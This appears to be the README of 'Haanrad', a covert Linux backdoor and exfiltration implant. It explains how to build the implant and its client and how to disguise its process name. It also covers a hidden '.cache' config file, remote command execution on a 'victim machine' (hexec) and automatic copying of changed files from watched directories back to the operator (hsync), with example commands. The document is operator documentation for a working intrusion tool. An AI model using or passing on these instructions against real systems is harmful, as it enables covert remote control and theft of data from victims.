#Haanrad
<b> FULL DISCLOSURE: THIS THING CAN DO BAD THINGS. UNLESS UR A BADMAN OR BATMAN, ITS STRONGLY ADVISED NOT TO BE USED </b>

Haanrad is a backdoor exfiltration system that allows a user to covertly exploit the installed system
haanrad is deployed to. Haanrad can be configured in numerous different ways and is designed to be
tolerant in most systems and adjust to the networks behavior as perceived by the victim machine in order
to "blend in". See the `Features` Section for details on functionality

#Setup

##Prerequisits
You must have cmake and gcc installed along with `libdnet` and `libpcap` development libraries installed in order to compile
Haanrad and the client. Note that Haanrad and the client will only work on the Linux based kernel and possibly some
versions of Mac or BSD

##Installation
Execute the following commands

1. clone the project and `cd` into the project root
2. Execute the following command `cmake .`
3. Then execute `make` if you are on Linux. This will generate all required programs in the project root under the `/bin` folder

##Usage
###Haanrad
Run Haanrad with the following command from within the `/bin` folder
```
./haanrad -c <ipofclient> [--DEBUG] [--DOF] [--HINT] [-t <timetick>] [-h <historylength>]
```
The parameters are as follows:

| Parameter | Purpose                                                                                | Required ? | Config File Support ? | Default                          | Example      |
| --------- | -------------------------------------------------------------------------------------- | ---------- | --------------------- | -------------------------------- | ------------ |
| -c        | Give the dot notation IP of the client                                                 | Yes        | Yes                   | N/A                              | -c 127.0.0.1 |
| -t        | Give time cycles of Haanrad in milliseconds, lower values will make Haanrad run faster | No         | Yes                   | 100                              | -t 450       |
| -h        | Set History Length of how many packet Haanrad will store                               | No         | Yes                   | 100                              | -h 200       |
| --DEBUG   | Get Debug Console Out                                                                  | No         | No                    | Disabled                         | ---DEBUG     |
| --DOF     | Set Haanrad to use default name on rename failure                                      | No         | No                    | Previous name is used on failure | --DOF        |
| --HINT    | Append `-bd` to the process name chosen for Haanrad                                    | No         | No                    | Not Appended                     | --HINT       |
 
####Config File Support
Haanrad supports some of the specified options to be declared within a configuration file. There is a very strict orientation
in how this file must be written in order to be picked up by Haanrad. The configuration file is only read at startup
and is never referred to afterwards. In order for the config file to be detected by haanrad it must be located in the same
location as the `haanrad` binary and named `.cache`. Settings are entered in the format of <key>=<value> with the key
being the supported flag listed above without the preceding dash (`-`). An example configuration file might look like this
```
c=127.0.0.1
t=150
```
Note there is no spacing at the beginning or end of the file, and no comments are accepted within the file. Invalid formatting
of the file may cause Haanrad to even crash and not load at all

###Client
Run the client with the following command from within the `/bin` folder
```
./client [--DEBUG]`
```
The parameters are as follows:

| Parameter | Purpose                             | Required ? | Config File Support ? | Default  | Example |
| --------- | ----------------------------------- | ---------- | --------------------- | -------- | ------- |
| --DEBUG   | Print Debug Information To Console  | No         | No                    | Disabled | --DEBUG |
 
###Interactive Mode
Upon Haanrad connecting to the client, interactive mode will enable. Making a number of commands available on the client. Each command has two layers,
a client specific command, and a haanrad specific command, followed then by the haanrad command parameter. The command structure is as follows:
```
<clientcommand> <haanradcommand> <haanradparam>
```
The following client commands are available:

| Command | Purpose                          |
| ------- | -------------------------------- |
| send    | Send A Command To Haanrad        |
| check   | Check For Responses From Haanrad |

The `check` command in the above table does not have any haanrad commands or haanrad params excepted as check is used specificaly for checking
for any new responses from Haanrad. `send` though has several options available. They are:

| Command | Purpose                                      | Parameter                          |
| ------- | -------------------------------------------- | ---------------------------------- |
| hexec   | Execute a terminal command on Haanrad        | Command to be executed             |
| hlisten | Create/Remove a listener of a directory      | Dir to Create/Remove listenr       |
| hsync   | Create/Remove a sync listener of a directory | Dir to Create/Remove sync listener |

Note the difference between the `hlisten` and `hsync` commands. Executing an `hlisten` will cause Haanrad to setup an inotify listener
in the parameter passed directroy. When an event occurs in this directory, a response will be sent from Haanrad back to the client. Using
`hlisten` this is then all that will happen. The client will simply be notified that an event occurred. If the `hsync` command is used though,
the client will be both notified of the event occurring and will also be sent a copy of the changed file. 

During an `hsync`, the client will download and write the file to the local `sync` directory, that will be generated if it does not previous exist. 
The `sync` directory is orgnaized to emulate the root path of the victim machine thus any synced files will have their folder structure recreated 
within the `sync` folder to emulate that of the victim machine.

Additionaly to the above mentioned commands a number of house keeping commands are available during response failure from Haanrad. The below can be
useful when a transfer fails and the client's buffer is left in an unstable state. Note these command are independent to anything previously
mentioned and do not run under the `send` or `check` client commands. See the examples for clarification.

| Command  | Purpose                                                  |
| -------- | -------------------------------------------------------- |
| bufcheck | Prints the current content of the Client receive buffer  |
| bufclear | Clears the current contents of the Client receive buffer |

Some command examples:
```
# Execute ls on the victim machine
send hexec ls

# Setup a sync listener for directory /haanrad/secret/info
send hsync /haanrad/secret/info

#Clear the client buffer
bufclear

#Print the client buffer
bufcheck
```